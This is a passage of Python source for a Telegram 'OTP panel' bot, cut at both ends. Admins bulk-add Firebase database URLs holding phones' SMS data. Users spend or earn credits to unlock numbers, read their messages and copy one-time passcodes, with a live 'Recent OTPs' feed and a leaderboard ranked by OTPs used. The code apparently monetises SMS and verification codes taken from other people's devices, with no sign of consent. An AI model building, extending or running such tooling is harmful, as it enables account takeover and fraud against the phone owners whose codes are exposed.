            DATABASES.pop(name, None); FIREBASE_STATE.pop(name, None); GLOBAL_DEVICE_CACHE.pop(name, None)
            await save_data_async()
            await query.answer(f"🗑 {name} deleted")
            await safe_edit(query, firebase_manager_text(page), reply_markup=firebase_manager_keyboard(page)); return

        if data == "fbm_bulk_add" and is_admin:
            pending_action[chat_id] = {"action": "fbm_bulk_add"}
            await safe_edit(query,
                "➕ <b>BULK ADD FIREBASE URLs</b>\n━━━━━━━━━━━━━━━━━━\n"
                "Send one per line. Format:\n"
                "<code>Name: https://url.firebaseio.com</code>\n"
                "or just the URL (auto name).\n\n"
                "Max 50 per batch. Each one is pre-verified.\n\n"
                "❌ Cancel: /cancel",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="fbm_refresh")]])); return

        if data == "fbm_verify_all" and is_admin:
            await safe_edit(query, "⏳ Verifying all active DBs...")
            s = await bulk_verify_all()
            txt = (f"🔎 <b>VERIFY ALL</b>\n━━━━━━━━━━━━━━━━━━\n"
                   f"✅ OK     : <b>{s['ok']}</b>\n❌ Failed : <b>{s['fail']}</b>\n"
                   f"📱 Devices: <b>{s['total_devices']}</b>\n🗄 Checked: <b>{s['checked']}</b>")
            await safe_edit(query, txt, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="fbm_refresh")]])); return

        if data == "fbm_purge_confirm" and is_admin:
            inact = [n for n in all_db_names() if FIREBASE_STATE.get(n, {}).get("status") == "inactive"]
            if not inact:
                await safe_edit(query, "✨ No inactive DBs.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="fbm_refresh")]])); return
            preview = "\n".join(f"🔴 {n}" for n in inact[:20])
            more = f"\n...and {len(inact)-20} more" if len(inact) > 20 else ""
            kb = InlineKeyboardMarkup([
                [InlineKeyboardButton(f"🗑 PURGE {len(inact)}", callback_data="fbm_purge_go")],
                [InlineKeyboardButton("❌ Cancel", callback_data="fbm_refresh")]])
            await safe_edit(query, f"⚠️ <b>Purge {len(inact)} inactive DBs?</b>\n\n{preview}{more}", reply_markup=kb); return
        if data == "fbm_purge_go" and is_admin:
            inact = [n for n in all_db_names() if FIREBASE_STATE.get(n, {}).get("status") == "inactive"]
            for n in inact:
                DATABASES.pop(n, None); FIREBASE_STATE.pop(n, None); GLOBAL_DEVICE_CACHE.pop(n, None)
            await save_data_async()
            await query.answer(f"🗑 Purged {len(inact)}")
            await safe_edit(query, firebase_manager_text(0), reply_markup=firebase_manager_keyboard(0)); return
        if data == "fbm_hold_all" and is_admin:
            for n in all_db_names(): ensure_state(n)["status"] = "hold"
            await save_data_async()
            await query.answer("⏸ All HOLD")
            await safe_edit(query, firebase_manager_text(0), reply_markup=firebase_manager_keyboard(0)); return
        if data == "fbm_activate_all" and is_admin:
            for n in all_db_names():
                st = ensure_state(n); st["status"] = "active"; st["fail_count"] = 0
            await save_data_async()
            await query.answer("▶️ All ACTIVE")
            await safe_edit(query, firebase_manager_text(0), reply_markup=firebase_manager_keyboard(0)); return

        # ─── Force-Join ───
        if data == "fjm_refresh" and is_admin:
            await safe_edit(query, fjm_text(), reply_markup=fjm_keyboard()); return
        if data == "fjm_add" and is_admin:
            pending_action[chat_id] = {"action": "fjm_add"}
            await safe_edit(query,
                "➕ <b>ADD FORCE-JOIN CHANNEL</b>\n━━━━━━━━━━━━━━━━━━\n"
                "Format: <code>@username | Display Name</code>\n"
                "Example: <code>@mychannel | My Channel</code>\n\n"
                "Or just <code>@username</code> (auto name).\n\n"
                "Bot must be admin in that channel.\n\n"
                "❌ Cancel: /cancel",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="fjm_refresh")]])); return
        if data.startswith("fjm_rm:") and is_admin:
            idx = int(data.split(":")[1])
            chs = CONFIG.get("channels", [])
            if 0 <= idx < len(chs):
                removed = chs.pop(idx)
                await save_data_async()
                await query.answer(f"🗑 Removed {removed['name']}")
            await safe_edit(query, fjm_text(), reply_markup=fjm_keyboard()); return
        if data == "fjm_rm_all" and is_admin:
            CONFIG["channels"] = []
            await save_data_async()
            await query.answer("🗑 All channels removed")
            await safe_edit(query, fjm_text(), reply_markup=fjm_keyboard()); return

        # ─── Access Engine ───
        if data == "acc_refresh" and is_admin:
            await safe_edit(query, acc_text(), reply_markup=acc_keyboard()); return
        if data.startswith("acc_edit:") and is_admin:
            key = data.split(":")[1]
            pending_action[chat_id] = {"action": "acc_edit", "key": key}
            cur = CONFIG["access"].get(key, 0)
            label = "Cost per device" if key == "number_cost" else "Duration (hours)"
            await safe_edit(query,
                f"✏️ <b>Edit {label}</b>\nCurrent: <b>{cur}</b>\n\nSend new numeric value:\n\n❌ Cancel: /cancel",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="acc_refresh")]])); return
        if data == "acc_reset" and is_admin:
            CONFIG["access"]["number_cost"] = 5
            CONFIG["access"]["number_hours"] = 6
            await save_data_async()
            await query.answer("♻️ Reset")
            await safe_edit(query, acc_text(), reply_markup=acc_keyboard()); return

        # ─── VIP Engine ───
        if data == "vipeng_refresh" and is_admin:
            await safe_edit(query, vipeng_text(), reply_markup=vipeng_keyboard()); return
        if data.startswith("vipeng_edit:") and is_admin:
            key = data.split(":")[1]
            pending_action[chat_id] = {"action": "vipeng_edit", "key": key}
            cur = CONFIG["vip"].get(key, 0)
            label = "Coin threshold" if key == "coin_threshold" else "Duration (hours)"
            await safe_edit(query,
                f"✏️ <b>Edit {label}</b>\nCurrent: <b>{cur}</b>\n\nSend new numeric value:\n\n❌ Cancel: /cancel",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="vipeng_refresh")]])); return
        if data == "vipeng_toggle" and is_admin:
            CONFIG["vip"]["auto_deduct"] = not CONFIG["vip"].get("auto_deduct", True)
            await save_data_async()
            await query.answer(f"💸 Auto-deduct = {CONFIG['vip']['auto_deduct']}")
            await safe_edit(query, vipeng_text(), reply_markup=vipeng_keyboard()); return
        if data == "vipeng_reset" and is_admin:
            CONFIG["vip"]["coin_threshold"] = 500
            CONFIG["vip"]["duration_hours"] = 24
            CONFIG["vip"]["auto_deduct"] = True
            await save_data_async()
            await query.answer("♻️ Reset")
            await safe_edit(query, vipeng_text(), reply_markup=vipeng_keyboard()); return

        # ─── Limit Engine ───
        if data == "lim_refresh" and is_admin:
            await safe_edit(query, lim_text(), reply_markup=lim_keyboard()); return
        if data.startswith("lim_edit:") and is_admin:
            key = data.split(":")[1]
            pending_action[chat_id] = {"action": "lim_edit", "key": key}
            label = next((l for k, l, _ in LIMIT_DEFS if k == key), key)
            cur = CONFIG["credits"].get(key, 0)
            await safe_edit(query,
                f"✏️ <b>Edit {label}</b>\nCurrent: <b>{cur}</b>\n\nSend new numeric value:\n\n❌ Cancel: /cancel",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="lim_refresh")]])); return
        if data == "lim_reset" and is_admin:
            CONFIG["credits"].update(DEFAULT_LIMITS)
            await save_data_async()
            await query.answer("♻️ Reset")
            await safe_edit(query, lim_text(), reply_markup=lim_keyboard()); return

        # ─── Credit Manager ───
        if data == "crm_refresh" and is_admin:
            await safe_edit(query, crm_text(), reply_markup=crm_keyboard()); return
        if data == "crm_give" and is_admin:
            pending_action[chat_id] = {"action": "crm_give"}
            await safe_edit(query,
                "➕ <b>Give Credits</b>\nFormat: <code>USER_ID AMOUNT</code>\n\n❌ Cancel: /cancel",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="crm_refresh")]])); return
        if data == "crm_take" and is_admin:
            pending_action[chat_id] = {"action": "crm_take"}
            await safe_edit(query,
                "➖ <b>Remove Credits</b>\nFormat: <code>USER_ID AMOUNT</code>\n\n❌ Cancel: /cancel",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="crm_refresh")]])); return
        if data == "crm_vip" and is_admin:
            pending_action[chat_id] = {"action": "crm_vip"}
            await safe_edit(query,
                "👑 <b>Grant VIP</b>\nFormat: <code>USER_ID HOURS</code>\n\n❌ Cancel: /cancel",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="crm_refresh")]])); return

        if data == "cmd_center" and is_admin:
            await safe_edit(query, COMMANDS_HELP, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_refresh")]])); return

        if data == "admin_add_firebase" and is_admin and is_main_bot:
            pending_action[chat_id] = {"action": "add_firebase_main"}
            await safe_edit(query, "🔗 Format: <code>Name: URL</code>\n\n❌ Cancel: /cancel",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="admin_refresh")]])); return
        if data == "add_custom_db" and not is_main_bot and is_admin:
            pending_action[chat_id] = {"action": "add_custom_db", "clone_token": bot_token}
            await safe_edit(query, "🔗 Send your Firebase URL.\n\n❌ Cancel: /cancel",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="admin_refresh")]])); return
        if data == "admin_users" and is_admin:
            if not users_db:
                await query.answer("No users.", show_alert=True); return
            lines = ["👥 <b>User List (Top 50)</b>\n━━━━━━━━━━━━━━━━━━\n"]
            for i, (uid, info) in enumerate(list(users_db.items())[:50], 1):
                icon = "🚫" if info.get("banned") else ("✅" if info.get("verified") else "⏳")
                lines.append(f"{i}. {icon} {user_display(info)}\n   ID: <code>{uid}</code> | OTPs: {info.get('otp_count',0)} | 💰{info.get('coins',0)}")
            text = "\n".join(lines)
            if len(text) > 4000: text = text[:4000] + "\n...[more]"
            await safe_edit(query, text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_refresh")]])); return
        if data == "admin_broadcast" and is_admin:
            pending_action[chat_id] = {"action": "broadcast_msg"}
            await safe_edit(query, "📢 Send broadcast message:\n\n❌ Cancel: /cancel",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="admin_refresh")]])); return
        if data == "admin_gift_coins" and is_admin:
            pending_action[chat_id] = {"action": "gift_coins_all"}
            await safe_edit(query, "🎁 How many credits to gift all?\n\n❌ Cancel: /cancel",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="admin_refresh")]])); return

        # ─── USER VIEWS (NO VIP GATE) ───
        if data == "home":
            user_focus.setdefault(bot_token, {}).pop(chat_id, None)
            pending_action.pop(chat_id, None)
            devices = await get_all_devices(bot_token)
            await safe_edit(query, device_list_header(devices, 0), reply_markup=device_list_keyboard(devices, 0)); return
        if data.startswith("pg:"):
            page = int(data[3:])
            devices = await get_all_devices(bot_token)
            await safe_edit(query, device_list_header(devices, page), reply_markup=device_list_keyboard(devices, page)); return
        if data == "online":
            devices = await get_all_devices(bot_token)
            online = [d for d in devices if d.status == "online"]
            await safe_edit(query, f"🟢 <b>ONLINE ({len(online)})</b>\n━━━━━━━━━━━━━━━━━━", reply_markup=online_only_keyboard(devices)); return
        if data.startswith("cp:"):
            await query.answer(f"✅ OTP: {data[3:]}", show_alert=True); return

        devices = await get_all_devices(bot_token)

        # ─── SELECT DEVICE ───
        if data.startswith("sel:"):
            dev_id = data[4:]
            device = next((d for d in devices if d.id == dev_id), None)
            if not device: await query.answer("❌ Not found", show_alert=True); return

            if not has_device_access(bot_token, chat_id, dev_id):
                cost = CONFIG["access"]["number_cost"]
                hrs = CONFIG["access"]["number_hours"]
                balance = users_db.get(chat_id, {}).get("coins", 0)
                can_afford = balance >= cost
                lock_text = (
                    f"🔒 <b>DEVICE LOCKED</b>\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"📱 Number : {device_label(device)}\n"
                    f"🔋 Status : {'🟢 Online' if device.status == 'online' else '🔴 Offline'}\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"💰 Unlock Cost : <b>{cost}</b> credits\n"
                    f"⏱ Access Time : <b>{hrs}</b> hours\n"
                    f"💎 Your Balance: <b>{balance}</b> credits\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                )
                if can_afford:
                    lock_text += "Unlock karne ke liye button dabao."
                else:
                    lock_text += f"❌ Not enough credits. Earn <b>{cost - balance}</b> more."
                await safe_edit(query, lock_text,
                    reply_markup=locked_device_keyboard(dev_id, cost, hrs, can_afford)); return

            user_focus.setdefault(bot_token, {})[chat_id] = dev_id
            label = device_label(device)
            status = "🟢 Online" if device.status == "online" else "🔴 Offline"
            access_str = device_access_left(bot_token, chat_id, dev_id)
            text = (f"📱 <b>CONNECTED</b>\n━━━━━━━━━━━━━━━━━━\n"
                    f"Number  : {label}\nStatus  : {status}\n"
                    f"Battery : {bat_emoji(device.battery)} {device.battery}%\n"
                    f"Access  : <b>{access_str}</b>\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"⚠️ Receiving LIVE OTPs for this number.")
            await safe_edit(query, text, reply_markup=device_action_keyboard(dev_id)); return

        # ─── PAY & UNLOCK ───
        if data.startswith("paydev:"):
            dev_id = data[7:]
            device = next((d for d in devices if d.id == dev_id), None)
            if not device:
                await query.answer("❌ Device not found", show_alert=True); return
            cost = CONFIG["access"]["number_cost"]
            hrs = CONFIG["access"]["number_hours"]
            if not remove_coins(users_db, chat_id, cost, f"Unlock: {device_label(device)}"):
                await query.answer("❌ Not enough credits.", show_alert=True); return
            grant_device_access(bot_token, chat_id, dev_id, hrs)
            user_focus.setdefault(bot_token, {})[chat_id] = dev_id
            await save_data_async()
            label = device_label(device)
            balance = users_db.get(chat_id, {}).get("coins", 0)
            access_str = device_access_left(bot_token, chat_id, dev_id)
            text = (f"✅ <b>UNLOCKED</b>\n━━━━━━━━━━━━━━━━━━\n"
                    f"Number  : {label}\n"
                    f"Access  : <b>{access_str}</b>\n"
                    f"💰 New Balance: <b>{balance}</b> credits\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"⚠️ Receiving LIVE OTPs for this number.")
            await query.answer(f"✅ Unlocked for {hrs}h!")
            await safe_edit(query, text, reply_markup=device_action_keyboard(dev_id)); return

        # ─── VIEW MESSAGES ───
        if data.startswith("msgs:"):
            dev_id = data[5:]
            device = next((d for d in devices if d.id == dev_id), None)
            if not device: await query.answer("❌", show_alert=True); return
            if not has_device_access(bot_token, chat_id, dev_id):
                await query.answer("🔒 Unlock this device first!", show_alert=True); return
            user_focus.setdefault(bot_token, {})[chat_id] = dev_id
            label = device_label(device)
            smss = await get_device_sms(device)
            if not smss:
                await safe_edit(query, f"📭 {label}\nNo SMS.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙", callback_data=f"sel:{dev_id}")]])); return
            header = f"📩 <b>MESSAGES</b>\n━━━━━━━━━━━━━━━━━━\n{label}\nShowing: {len(smss)}\n━━━━━━━━━━━━━━━━━━\n\n"
            parts, btns, has_otp = [], [], False
            for sms in smss:
                block, otp = format_sms_block(sms, label)
                parts.append(block)
                if otp:
                    has_otp = True
                    btns.append([InlineKeyboardButton(f"📋 Copy OTP: {otp}", callback_data=f"cp:{otp}")])
            if has_otp:
                users_db.setdefault(chat_id, {})["otp_count"] = users_db.get(chat_id, {}).get("otp_count", 0) + 1
            full = header + ("\n━━━━━━━━━━━━━━━━━━\n\n").join(parts)
            if len(full) > 4000: full = full[:4000] + "\n...[truncated]"
            btns.append([InlineKeyboardButton("🔙 Back", callback_data=f"sel:{dev_id}")])
            await safe_edit(query, full, reply_markup=InlineKeyboardMarkup(btns)); return

        # ─── DEVICE INFO ───
        if data.startswith("info:"):
            dev_id = data[5:]
            device = next((d for d in devices if d.id == dev_id), None)
            if not device: await query.answer("❌", show_alert=True); return
            if not has_device_access(bot_token, chat_id, dev_id):
                await query.answer("🔒 Unlock this device first!", show_alert=True); return
            user_focus.setdefault(bot_token, {})[chat_id] = dev_id
            label = device_label(device)
            status = "🟢 Online" if device.status == "online" else "🔴 Offline"
            text = (f"ℹ️ <b>DEVICE</b>\n━━━━━━━━━━━━━━━━━━\n"
                    f"Number: {label}\nStatus: {status}\n"
                    f"Battery: {bat_emoji(device.battery)} {device.battery}%\n"
                    f"Access: {device_access_left(bot_token, chat_id, dev_id)}\n")
            for i, n in enumerate(device.numbers, 1): text += f"SIM {i}: <code>{n}</code>\n"
            if device.device_info: text += f"\n{device.device_info}\n"
            kb = InlineKeyboardMarkup([
                [InlineKeyboardButton("📩 Messages", callback_data=f"msgs:{dev_id}"), InlineKeyboardButton("ℹ️ Back", callback_data=f"sel:{dev_id}")],
                [InlineKeyboardButton("🔙 Disconnect", callback_data="home")]])
            await safe_edit(query, text, reply_markup=kb); return

    except Exception as e:
        tlog(f"❌ Callback [{data}]: {e}")

# ══════════════════════════════════════════════════════════════
#  TEXT HANDLER
# ══════════════════════════════════════════════════════════════

async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    text = (update.message.text or "").strip()
    bot_token = ctx.bot.token
    is_main_bot = (bot_token == TOKEN)

    if not is_main_bot:
        if bot_token not in CLONES: return
        if time.time() > CLONES[bot_token]["expiry"]:
            await update.message.reply_text("Premium expired.", parse_mode="HTML"); return
        users_db = CLONES[bot_token]["users"]
        is_admin = (chat_id == CLONES[bot_token]["creator"])
    else:
        users_db = all_users
        is_admin = (chat_id in ADMIN_IDS)

    if users_db.get(chat_id, {}).get("banned"): return
    await send_bonus_if_applicable(ctx, chat_id, users_db, is_main_bot)

    if is_admin and text.startswith("/ban "):
        try:
            tid = int(text.split()[1])
            if tid in users_db:
                users_db[tid]["banned"] = True
                await update.message.reply_text(f"✅ Banned <code>{tid}</code>", parse_mode="HTML")
        except: pass
        return
    if is_admin and text.startswith("/unban "):
        try:
            tid = int(text.split()[1])
            if tid in users_db:
                users_db[tid]["banned"] = False
                await update.message.reply_text(f"✅ Unbanned <code>{tid}</code>", parse_mode="HTML")
        except: pass
        return
    if is_admin and text.startswith("/give "):
        try:
            parts = text.split()
            tid = int(parts[1]); amt = int(parts[2])
            _add_credits(tid, amt, "admin gift")
            await update.message.reply_text(f"✅ Gave {amt} credits to <code>{tid}</code>", parse_mode="HTML")
        except: pass
        return
    if is_admin and text.startswith("/take "):
        try:
            parts = text.split()
            tid = int(parts[1]); amt = int(parts[2])
            if remove_coins(users_db, tid, amt, "admin deduct"):
                await update.message.reply_text(f"✅ Took {amt} from <code>{tid}</code>", parse_mode="HTML")
            else:
                await update.message.reply_text("❌ Not enough balance.")
        except: pass
        return
    if is_admin and text.startswith("/vip "):
        try:
            parts = text.split()
            tid = int(parts[1]); hrs = int(parts[2])
            users_db.setdefault(tid, {})
            cur = users_db[tid].get("vip_until", 0.0)
            users_db[tid]["vip_until"] = max(time.time(), cur) + hrs * 3600
            await update.message.reply_text(f"✅ {hrs}h VIP to <code>{tid}</code>", parse_mode="HTML")
        except: pass
        return
    if is_admin and text == "/reload":
        await update.message.reply_text("🔄 Reloading DBs...")
        for tag, url in DATABASES.items():
            try:
                devs = await fetch_db_data(tag, url)
                GLOBAL_DEVICE_CACHE[tag] = devs
                ensure_state(tag)["device_count"] = len(devs)
            except: pass
        await save_data_async()
        await update.message.reply_text("✅ Reloaded.")
        return
    if is_admin and text == "/stats":
        total_credits = sum(u.get("coins", 0) for u in all_users.values())
        await update.message.reply_text(
            f"📊 <b>GLOBAL STATS</b>\n━━━━━━━━━━━━━━━━━━\n"
            f"👥 Users: <b>{len(all_users)}</b>\n"
            f"💰 Credits: <b>{total_credits}</b>\n"
            f"🗄 DBs: <b>{len(DATABASES)}</b>", parse_mode="HTML")
        return

    if is_spamming(chat_id): return

    if text == "📱 Devices List":
        pending_action.pop(chat_id, None)
        devices = await get_all_devices(bot_token)
        await update.message.reply_text(device_list_header(devices, 0),
            reply_markup=device_list_keyboard(devices, 0), parse_mode="HTML")
        return
    if text == "🔍 Search Number":
        pending_action[chat_id] = {"action": "search_number"}
        await update.message.reply_text("🔍 Enter number to search:\n\n❌ /cancel", parse_mode="HTML")
        return
    if text == "💰 My Access":
        acc = users_db.get(chat_id, {}).get("number_access", {})
        now = time.time()
        active = [(k, v) for k, v in acc.items() if v > now]
        text_out = (f"💰 <b>MY DEVICE ACCESS</b>\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"🪙 Credits: <b>{users_db.get(chat_id, {}).get('coins', 0)}</b>\n"
                    f"👑 VIP: {get_vip_time_left(bot_token, chat_id)}\n"
                    f"🔓 Active devices: <b>{len(active)}</b>\n")
        if active:
            text_out += "\n<b>Your unlocked devices:</b>\n"
            for dev_id, exp in active[:10]:
                left = exp - now
                h = int(left // 3600); m = int((left % 3600) // 60)
                text_out += f"• <code>{dev_id[:16]}</code> — {h}h {m}m left\n"
            if len(active) > 10:
                text_out += f"... +{len(active) - 10} more\n"
        await update.message.reply_text(text_out, parse_mode="HTML"); return
    if text == "📊 Bot Status" and is_admin:
        devices = await get_all_devices(bot_token)
        online = sum(1 for d in devices if d.status == "online")
        await update.message.reply_text(
            f"📊 <b>STATUS</b>\n📱 {len(devices)} devices\n🟢 {online} online",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔄", callback_data="cmd_status")]]), parse_mode="HTML")
        return
    if text == "🔑 Recent OTPs":
        wait = await update.message.reply_text("⏳ Fetching...")
        devices = await get_all_devices(bot_token)
        found = []
        for d in devices:
            if not has_device_access(bot_token, chat_id, d.id):
                continue
            for sms in await get_device_sms(d, 20):
                body = sms.get("body") or sms.get("message") or sms.get("text") or ""
                otp = extract_otp(body)
                if otp: found.append((otp, device_label(d), sms.get("sender") or "?", sms_date(sms)))
            if len(found) >= 10: break
        if not found:
            await wait.edit_text("📭 No recent OTPs on unlocked devices."); return
        txt = "🔑 <b>RECENT OTPS</b>\n━━━━━━━━━━━━━━━━━━\n"
        for otp, lbl, snd, dt in found[:10]:
            txt += f"<code>{otp}</code> — {lbl} ({snd}) — {dt}\n"
        await wait.edit_text(txt, parse_mode="HTML")
        return
    if text == "👑 Buy VIP":
        cost = CONFIG["access"]["number_cost"]
        hrs = CONFIG["access"]["number_hours"]
        thr = CONFIG["vip"]["coin_threshold"]
        vdur = CONFIG["vip"]["duration_hours"]
        await update.message.reply_text(
            f"👑 <b>VIP INFO</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"<b>VIP Benefits:</b> Unlimited access to ALL devices!\n\n"
            f"<b>Two ways to get VIP:</b>\n"
            f"1️⃣ <b>Auto-VIP:</b> Reach <b>{thr}</b> credits → get {vdur}h VIP\n"
            f"2️⃣ <b>Manual:</b> Contact admin for custom VIP\n\n"
            f"<b>Current Stats:</b>\n"
            f"💰 Your credits: <b>{users_db.get(chat_id, {}).get('coins', 0)}</b>\n"
            f"👑 VIP status: {get_vip_time_left(bot_token, chat_id)}\n\n"
            f"<i>Non-VIP access: {cost} credits per device / {hrs}h</i>",
            parse_mode="HTML")
        return
    if text == "🏆 Leaderboard":
        s = sorted(users_db.items(), key=lambda x: x[1].get("otp_count", 0), reverse=True)[:10]
        txt = "🏆 <b>LEADERBOARD</b>\n━━━━━━━━━━━━━━━━━━\n"
        for i, (uid, info) in enumerate(s, 1):
            txt += f"{i}. {info.get('name', '?')} — {info.get('otp_count', 0)} OTPs\n"
        await update.message.reply_text(txt, parse_mode="HTML"); return
    if text == "💸 Refer & Earn":
        ref = f"https://t.me/{BOT_USERNAME}?start={chat_id}"
        ref_data = users_db.get(chat_id, {})
        cap = CONFIG["credits"]["max_referrals"]
        today = datetime.now().strftime("%Y-%m-%d")
        refer_today = ref_data.get("refer_today", {"date": today, "count": 0})
        used = refer_today["count"] if refer_today["date"] == today else 0
        txt = (f"💸 <b>REFER & EARN</b>\n━━━━━━━━━━━━━━━━━━\n"
               f"Per referral: <b>{CONFIG['credits']['refer_bonus']} credits</b>\n"
               f"Daily limit: <b>{used}/{cap}</b>\n\n"
               f"Your link:\n<code>{ref}</code>\n\n"
               f"Total referrals: {ref_data.get('referrals', 0)}")
        kb = InlineKeyboardMarkup([[InlineKeyboardButton("Share ↗️", url=f"https://t.me/share/url?url={ref}&text=Try this OTP Panel Bot!")]])
        await update.message.reply_text(txt, disable_web_page_preview=True, reply_markup=kb, parse_mode="HTML")
        return
    if text == "👤 My Profile":
        ud = users_db.get(chat_id, {})
        hist = ud.get("coin_history", [])
        hist_txt = ""
        if hist:
            hist_txt = "\n\n💰 <b>Recent Activity:</b>\n"
            for h in hist[:5]:
                sign = "+" if h["amount"] > 0 else ""
                hist_txt += f"  {sign}{h['amount']} — {h.get('reason','')[:30]} ({h.get('time','')})\n"
        txt = (f"👤 <b>PROFILE</b>\n━━━━━━━━━━━━━━━━━━\n"
               f"Name: {ud.get('name','?')}\nID: <code>{chat_id}</code>\n"
               f"Joined: {ud.get('joined_at','?')}\n"
               f"💰 Credits: <b>{ud.get('coins',0)}</b>\n"
               f"👥 Referrals: {ud.get('referrals',0)}\n"
               f"📩 OTPs Used: {ud.get('otp_count',0)}\n"
               f"👑 VIP: {get_vip_time_left(bot_token, chat_id)}"
               f"{hist_txt}")
        await update.message.reply_text(txt, parse_mode="HTML"); return
    if text == "💬 Support":
        await update.message.reply_text("Contact admin for support."); return
    if text == "🛡 Admin Panel" and is_admin:
        await update.message.reply_text(admin_panel_text(bot_token), reply_markup=admin_keyboard(bot_token), parse_mode="HTML"); return
    if text.lower() in ("/cancel", "cancel"):
        if chat_id in pending_action:
            pending_action.pop(chat_id)
            await update.message.reply_text("✅ Cancelled.")
        else:
            await update.message.reply_text("ℹ️ Nothing to cancel.")
        return

    state = pending_action.get(chat_id)
    if not state: return
    action = state.get("action")

    if action == "fbm_bulk_add" and is_admin:
        pending_action.pop(chat_id)
        lines = [ln.strip() for ln in text.splitlines() if ln.strip()]
        wait = await update.message.reply_text(f"⏳ Processing {len(lines)} entries...")
        added, skipped, verified, failed = [], [], 0, 0
        for ln in lines[:50]:
            if ":" in ln and not ln.startswith("http"):
                parts = ln.split(":", 1)
                name = slugify(parts[0].strip()); url = parts[1].strip()
            else:
                url = ln
                m = re.search(r"https?://([^\.]+)", url)
                name = slugify(m.group(1).replace("-", "_").title()) if m else f"DB_{int(time.time())%100000}"
            if not url.startswith("http"):
                skipped.append(f"{ln[:40]} (bad url)"); continue
            base = name; i = 2
            while name in DATABASES:
                name = f"{base}_{i}"; i += 1
            try:
                session = await get_http_session()
                async with session.get(f"{url}/.json?shallow=true", timeout=aiohttp.ClientTimeout(total=5)) as r:
                    if r.status != 200: skipped.append(f"{name} (HTTP {r.status})"); continue
            except Exception as e:
                skipped.append(f"{name} ({str(e)[:30]})"); continue
            DATABASES[name] = url
            st = ensure_state(name); st["added_at"] = time.time(); st["status"] = "active"
            added.append(name)
            try:
                devs = await fetch_db_data(name, url)
                GLOBAL_DEVICE_CACHE[name] = devs
                st["device_count"] = len(devs); st["last_check"] = time.time(); st["fail_count"] = 0
                verified += 1
            except: failed += 1
        await save_data_async()
        result = (f"✅ <b>BULK ADD DONE</b>\n━━━━━━━━━━━━━━━━━━\n"
                  f"➕ Added: <b>{len(added)}</b>\n✔️ Verified: <b>{verified}</b>\n"
                  f"⚠️ Fetch fail: <b>{failed}</b>\n⏭ Skipped: <b>{len(skipped)}</b>\n")
        if skipped: result += "\n<b>Skipped:</b>\n" + "\n".join(f"• {s}" for s in skipped[:10])
        await wait.edit_text(result, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🗄 Manager", callback_data="fbm_refresh")]]), parse_mode="HTML")
        return

    if action == "add_firebase_main" and is_admin:
        pending_action.pop(chat_id)
        if ":" in text and not text.startswith("http"):
            parts = text.split(":", 1); name = slugify(parts[0]); url = parts[1].strip()
        else:
            url = text
            m = re.search(r"https?://([^\.]+)", url)
            name = slugify(m.group(1).replace("-", "_").title()) if m else f"DB_{len(DATABASES)+1}"
        if not url.startswith("http"):
            await update.message.reply_text("⚠️ Invalid URL."); return
        base = name; i = 2
        while name in DATABASES: name = f"{base}_{i}"; i += 1
        DATABASES[name] = url; ensure_state(name)
        try:
            devs = await fetch_db_data(name, url)
            GLOBAL_DEVICE_CACHE[name] = devs
            st = ensure_state(name); st["device_count"] = len(devs); st["last_check"] = time.time()
            await update.message.reply_text(f"✅ Added <b>{name}</b> — {len(devs)} devices", parse_mode="HTML")
        except Exception as e:
            await update.message.reply_text(f"⚠️ Added, fetch failed: {e}")
        await save_data_async(); return

    if action == "fjm_add" and is_admin:
        pending_action.pop(chat_id)
        if "|" in text:
            parts = text.split("|", 1)
            username = parts[0].strip().lstrip("@"); name = parts[1].strip()
        else:
            username = text.strip().lstrip("@"); name = username
        if not username:
            await update.message.reply_text("⚠️ Invalid format."); return
        url = f"https://t.me/{username}"
        CONFIG.setdefault("channels", []).append({"name": name, "username": username, "url": url})
        await save_data_async()
        await update.message.reply_text(f"✅ Channel <b>{name}</b> added.", parse_mode="HTML")
        return

    if action == "lim_edit" and is_admin:
        pending_action.pop(chat_id)
        key = state.get("key")
        try: val = int(text)
        except: await update.message.reply_text("⚠️ Numbers only."); return
        CONFIG["credits"][key] = val
        await save_data_async()
        await update.message.reply_text(f"✅ <b>{key}</b> = <b>{val}</b>", parse_mode="HTML")
        return

    if action == "acc_edit" and is_admin:
        pending_action.pop(chat_id)
        key = state.get("key")
        try: val = int(text)
        except: await update.message.reply_text("⚠️ Numbers only."); return
        if val < 0: await update.message.reply_text("⚠️ Positive value."); return
        CONFIG["access"][key] = val
        await save_data_async()
        await update.message.reply_text(f"✅ <b>{key}</b> = <b>{val}</b>", parse_mode="HTML")
        return

    if action == "vipeng_edit" and is_admin:
        pending_action.pop(chat_id)
        key = state.get("key")
        try: val = int(text)
